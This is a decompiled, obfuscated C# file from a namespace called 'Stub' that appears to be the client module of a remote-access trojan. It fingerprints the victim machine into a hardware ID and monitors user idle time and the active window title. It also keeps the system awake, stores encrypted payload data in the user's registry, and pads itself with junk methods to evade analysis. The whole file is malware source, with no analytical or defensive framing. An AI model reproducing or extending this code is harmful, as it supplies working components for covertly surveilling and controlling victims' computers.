using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub;

[StandardModule]
internal sealed class qAySVw7iIJbFXva0BV84CUpJ8atpj
{
	public struct LASTINPUTINFO
	{
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	public static FileStream fileStream_0;

	private const string khrlQerSVTzqVHQp3RSAKkhBPaVYm = "abcdefghijklmnopqrstuvwxyz";

	public static Random KDvlC3QDOVZlti730Zx8pmrE7g1OX = new Random();

	private static readonly string gUujV4vrBAJx9FoGQRicA1VTpvSYn = "Software\\" + OsD7KxHPmHj6Nqe8p0a7Zy1rhlCa9();

	public static string string_0 = Process.GetCurrentProcess().MainModule!.FileName;

	private static int LxfH8R12SvSYCEMCZxLZa3fvAcvSq;

	private static LASTINPUTINFO cHHxWFbFjOENclatdrQSP7R6Galeu = default(LASTINPUTINFO);

	public static TimeSpan dMRuICyyXsqWZ8yjHfMEOYEjQDwEO = new TimeSpan(0L);

	public static int aUmnMld1l588qVt8MpPD4Fyfr2Zhw;

	public static string g7KmtdlSqW74HUIjWjqW202xjGbVJ;

	public static string[] anDrPpEJDfYK1uZMURRZjSS1qOAzU = new string[3] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };

	public static Mutex tAtOWp4xzLR95u0qZaI8BRrLD9MbD;

	public static string Fyq6CSLxtHVuwJoPVARGZ2l2ePigO(int gtRU69rgNfivM6ikmRu4kgHxEWhU2)
	{
		StringBuilder stringBuilder = new StringBuilder(gtRU69rgNfivM6ikmRu4kgHxEWhU2);
		checked
		{
			int num = gtRU69rgNfivM6ikmRu4kgHxEWhU2 - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyz"[KDvlC3QDOVZlti730Zx8pmrE7g1OX.Next("abcdefghijklmnopqrstuvwxyz".Length)]);
			}
			return stringBuilder.ToString();
		}
	}

	[DllImport("user32.dll")]
	public static extern bool GetLastInputInfo(ref LASTINPUTINFO RA5L2GjmH52BhgFuQd19BSlxPxg4c);

	public static int zXaCasWOUnQ0QuIqMpHGn60rRbEDu()
	{
		LxfH8R12SvSYCEMCZxLZa3fvAcvSq = 0;
		cHHxWFbFjOENclatdrQSP7R6Galeu.cbSize = Marshal.SizeOf(cHHxWFbFjOENclatdrQSP7R6Galeu);
		cHHxWFbFjOENclatdrQSP7R6Galeu.dwTime = 0;
		checked
		{
			if (GetLastInputInfo(ref cHHxWFbFjOENclatdrQSP7R6Galeu))
			{
				LxfH8R12SvSYCEMCZxLZa3fvAcvSq = Environment.TickCount - cHHxWFbFjOENclatdrQSP7R6Galeu.dwTime;
			}
			if (LxfH8R12SvSYCEMCZxLZa3fvAcvSq > 0)
			{
				return (int)Math.Round((double)LxfH8R12SvSYCEMCZxLZa3fvAcvSq / 1000.0);
			}
			return 0;
		}
	}

	public static object e7n6oXHNExTkPsxeBYYIxgTKSZSlO()
	{
		while (true)
		{
			Thread.Sleep(1000);
			int num = zXaCasWOUnQ0QuIqMpHGn60rRbEDu();
			if (aUmnMld1l588qVt8MpPD4Fyfr2Zhw <= num)
			{
				g7KmtdlSqW74HUIjWjqW202xjGbVJ = Conversions.ToString(zXaCasWOUnQ0QuIqMpHGn60rRbEDu());
			}
			else
			{
				dMRuICyyXsqWZ8yjHfMEOYEjQDwEO = dMRuICyyXsqWZ8yjHfMEOYEjQDwEO.Add(TimeSpan.FromSeconds(aUmnMld1l588qVt8MpPD4Fyfr2Zhw));
			}
			aUmnMld1l588qVt8MpPD4Fyfr2Zhw = num;
		}
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr Hx7OGllWLpM33aEJhHcod1HdR4jnz, StringBuilder f2N2RXBDnR8TRNV6evyN8Q7DfZ4IV, int QteOAa9JUTX0tFdPpeNSODqpCeevS);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE iDr6360lPR9v9TjcjLXBAmV6dLluc);

	public static void smethod_0()
	{
		try
		{
			SetThreadExecutionState((EXECUTION_STATE)2147483651u);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string igT7CpTVyt7uJ8zxg2qlGDme7b1V2()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = GetForegroundWindow();
			if (GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	public static byte[] awIN8rQrxfSgbuPkfpx0WtQtoT6UL(string o4TXdxh1M44Up6sdpaWGexEhm3T36)
	{
		return Encoding.Default.GetBytes(o4TXdxh1M44Up6sdpaWGexEhm3T36);
	}

	public static string OXTlAlW2vH5hXJMudCn8IxV5mLkoX(byte[] yXL9rHFG8aSkokeDQcJboJjYpvx5b)
	{
		return Encoding.Default.GetString(yXL9rHFG8aSkokeDQcJboJjYpvx5b);
	}

	public static string OsD7KxHPmHj6Nqe8p0a7Zy1rhlCa9()
	{
		try
		{
			return jIBjM2ZADLZY7Gc8ByjNuN9UYMDQl(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Err HWID";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string jIBjM2ZADLZY7Gc8ByjNuN9UYMDQl(string d9CPyQtPlVw78JFYV5bW47u9AbA0L)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(d9CPyQtPlVw78JFYV5bW47u9AbA0L);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}

	public static bool YKqGRs8QzfUBH25bJ3kN31nL16gRl(string string_1, byte[] BwVtUH6joIuDJ8OtoxPrMwwjwMNaS)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(gUujV4vrBAJx9FoGQRicA1VTpvSYn, RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey.SetValue(string_1, BwVtUH6joIuDJ8OtoxPrMwwjwMNaS, RegistryValueKind.Binary);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static byte[] KV3ZtKY0CJTjwF0kGt5IsWAbDj7wD(string UQbvwEGv0WSknzQoxHeSBTERMGiOk)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(gUujV4vrBAJx9FoGQRicA1VTpvSYn);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(UQbvwEGv0WSknzQoxHeSBTERMGiOk));
			return (byte[])objectValue;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public static byte[] hn7jiQDmaSG6gz6G7pTKyoAv26yYF(byte[] nDGRVaoUwWsoGFdjlFzhOOwdM5uuD)
	{
		object obj = new MemoryStream(nDGRVaoUwWsoGFdjlFzhOOwdM5uuD);
		try
		{
			byte[] array = new byte[4];
			object[] array2 = new object[3] { array, 0, 4 };
			object[] array3 = array2;
			bool[] array4 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Read", array3, (string[])null, (Type[])null, array4, true);
			if (array4[0])
			{
				array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
			}
			object obj2 = BitConverter.ToInt32(array, 0);
			object obj3 = new GZipStream((Stream)obj, CompressionMode.Decompress);
			try
			{
				object obj4 = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(obj2, (object)1)) + 1)];
				object[] array5 = new object[3]
				{
					RuntimeHelpers.GetObjectValue(obj4),
					0,
					RuntimeHelpers.GetObjectValue(obj2)
				};
				object[] array6 = array5;
				array4 = new bool[3] { true, false, true };
				NewLateBinding.LateCall(obj3, (Type)null, "Read", array6, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					obj4 = RuntimeHelpers.GetObjectValue(array5[0]);
				}
				if (array4[2])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array5[2]);
				}
				return (byte[])obj4;
			}
			finally
			{
				if (obj3 != null)
				{
					((IDisposable)obj3).Dispose();
				}
			}
		}
		finally
		{
			if (obj != null)
			{
				((IDisposable)obj).Dispose();
			}
		}
	}

	public static byte[] H0rGQhUdI3Ox36SEgrWYfuKvyw6nb(byte[] Wq08fjBpKZoS6PUFaiwllyPkaL74E)
	{
		object obj = new MemoryStream();
		try
		{
			object bytes = BitConverter.GetBytes(Wq08fjBpKZoS6PUFaiwllyPkaL74E.Length);
			object[] array = new object[3]
			{
				RuntimeHelpers.GetObjectValue(bytes),
				0,
				4
			};
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				bytes = RuntimeHelpers.GetObjectValue(array[0]);
			}
			object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress);
			try
			{
				object[] array4 = new object[3] { Wq08fjBpKZoS6PUFaiwllyPkaL74E, 0, Wq08fjBpKZoS6PUFaiwllyPkaL74E.Length };
				object[] array5 = array4;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array5, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					Wq08fjBpKZoS6PUFaiwllyPkaL74E = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			finally
			{
				if (obj2 != null)
				{
					((IDisposable)obj2).Dispose();
				}
			}
			return (byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
		}
		finally
		{
			if (obj != null)
			{
				((IDisposable)obj).Dispose();
			}
		}
	}

	public static byte[] x1QO0vMgymyMdZTz0T9eghkbT5FFm(byte[] SxHT5eQU1xIWpz91y3sTO0B3DNpjY)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(awIN8rQrxfSgbuPkfpx0WtQtoT6UL(LLQqOMuku02a3eSHe7KxkMgL5QsXp0CTkIoG4QmrIXrV.string_0));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			result = cryptoTransform.TransformFinalBlock(SxHT5eQU1xIWpz91y3sTO0B3DNpjY, 0, SxHT5eQU1xIWpz91y3sTO0B3DNpjY.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] RfThBuCHvR22vZzEkUKo2JcZUYWNJ(byte[] YpqFvAWPZut2vHTLHGOMPENvdsLlm)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(awIN8rQrxfSgbuPkfpx0WtQtoT6UL(LLQqOMuku02a3eSHe7KxkMgL5QsXp0CTkIoG4QmrIXrV.string_0));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(YpqFvAWPZut2vHTLHGOMPENvdsLlm, 0, YpqFvAWPZut2vHTLHGOMPENvdsLlm.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool vh1e5jrhdexVoJEqSdBuKINEqRKUY()
	{
		tAtOWp4xzLR95u0qZaI8BRrLD9MbD = new Mutex(initiallyOwned: false, LLQqOMuku02a3eSHe7KxkMgL5QsXp0CTkIoG4QmrIXrV.OmkQsr833DuNM3zEXoDlca3JH8nZdkisYEjzAB4NptCr, out var createdNew);
		return createdNew;
	}

	public static void II3Q1yttVO6yItJ3nHVkUqtGV7qXJ()
	{
		if (tAtOWp4xzLR95u0qZaI8BRrLD9MbD != null)
		{
			tAtOWp4xzLR95u0qZaI8BRrLD9MbD.Close();
			tAtOWp4xzLR95u0qZaI8BRrLD9MbD = null;
		}
	}

	public static string GaZ58aXawElDRfraG2Znd()
	{
		return "i6ZsR3wbg5YsoThHofVkk";
	}

	public static int flmTzfANzrQfQk1AAbpaG()
	{
		return 17474955;
	}

	public static string EMzzQL8WKK61Zwtnp7DfO()
	{
		return "qnp74ehqhv3nASiS5NBkn";
	}

	public static int OPbATgRcpycy5fBIJcpLV()
	{
		return 29351920;
	}

	public static string MMZUTmiqf3lvifzhUcesh()
	{
		return "zeNexSiEALmiLoXjLakrz";
	}

	public static int HnCNF19K5cP72tvqGFxqV()
	{
		return 98800480;
	}

	public static string FKNuMBw6SrRHgy1j6W5Iv()
	{
		return "Xi1uFiJWHa9Y2DuZK9aRZ";
	}

	public static int S1VpMOcc42sIk5SYImxhW()
	{
		return 99784308;
	}

	public static string ddqBfIfWYCE7gMkTs2h3G()
	{
		return "Em76y05KvcqNr8qRkVuSH";
	}

	public static int YtfXPh58vWKwEdtRdjsyh()
	{
		return 90564577;
	}

	public static string Dq5a8H2QKuBfKuOH3Tip9()
	{
		return "5EjMbV85coIQoop1WLjyH";
	}

	public static int dcafWh4monbj9Z1ROpOIa()
	{
		return 86079514;
	}

	public static string EOxV3Bk41rpuh7VLpB0nX()
	{
		return "2iHRPrdJxD7IdEbJlYA1j";
	}

	public static int sXkcoNFYmilddo2eSb9rQ()
	{
		return 86079514;
	}

	public static string MfVgq2oEgAzkmiFfHt6HM()
	{
		return "HjVVqrpw6dYnncRi6ApuT";
	}

	public static int eR7eddNVdkTlCM4c3ADeL()
	{
		return 29351920;
	}

	public static string y98Q7F9JwG1WBFbknfixz()
	{
		return "NX6zzpwlnLzfUzpCPVNlN";
	}

	public static int PqAWsRCdv4eLPTiwroDyC()
	{
		return 72624326;
	}

	public static string H3J8UkxwRyUNrD3l93WvQ()
	{
		return "eOvKpEzYjOWOZ1qMbdvSW";
	}

	public static int smethod_1()
	{
		return 60313988;
	}

	public static string VWbyOhG48sdNzGVP6DaQo()
	{
		return "afixgtrMQDmuDuIzzwiTT";
	}

	public static int uYXkoyUJnOecrdEtMsl1z()
	{
		return 29351920;
	}

	public static string Uu24ipgZA50GSXMjQv0W7()
	{
		return "dzKR16xrxYaXh52nC3CNX";
	}

	public static int jzNDPI6t0KhpDrJgLYAIx()
	{
		return 86079514;
	}

	public static string smethod_2()
	{
		return "BTfq3sKWHWSR45fpMbJVs";
	}

	public static int UO3ALhdRPSRuRj8gKLdCh()
	{
		return 19053177;
	}

	public static string l1Sf7oqy2k0dZrMcXfrEl()
	{
		return "k0pxq6TbGCgUadfQ3gZTy";
	}

	public static int H4yJijbWf60r5zX43YWgl()
	{
		return 42807109;
	}

	public static string iahFCudseq3MzErBEk26R()
	{
		return "otltvkAa9oRDq4TdQLaXP";
	}

	public static int QLwHUzwGVLdnwoBydwpEB()
	{
		return 72624326;
	}

	public static string qzML5Hf0Rc9pxvuCD39eY()
	{
		return "LRQ9Cayd3IvyWM5YjbLIm";
	}

	public static int WbvN4PDUro77h4wQDKcKQ()
	{
		return 84477063;
	}

	public static string DcU2RNtpdIDYH0B9rqiEL()
	{
		return "asekXtG1ZGXNXuQEnBlxL";
	}

	public static int vPArbg81wHdlGnPqTh0wA()
	{
		return 29351920;
	}

	public static string kkegY2BqKyc2xW4PvA3qM()
	{
		return "gKBhbOKqrAzkAngPtPBs4";
	}

	public static int smethod_3()
	{
		return 86079514;
	}

	public static string FlMxFJNkCsfgvIFR6CxLZ()
	{
		return "sYtTBU02faFTARypqMW3V";
	}

	public static int smethod_4()
	{
		return 6346804;
	}

	public static string EexhiVeTcHKvVI7T4pwdV()
	{
		return "1jmXMjoh5HLCdgeVg9gy7";
	}

	public static int QCvrx3IvzBerTJNUcnPRj()
	{
		return 72624326;
	}

	public static string MjSp803td572h20CboDA5()
	{
		return "RqCCFdbT5ZdkY83whbhL2";
	}

	public static int dkNxg7XHMwxnH4HZZWu8K()
	{
		return 72624326;
	}

	public static string A0EqdDKTvDHtofCezz0DE()
	{
		return "PcuzzFgkZZRZCzp85XX5t";
	}

	public static int smethod_5()
	{
		return 89404972;
	}
}
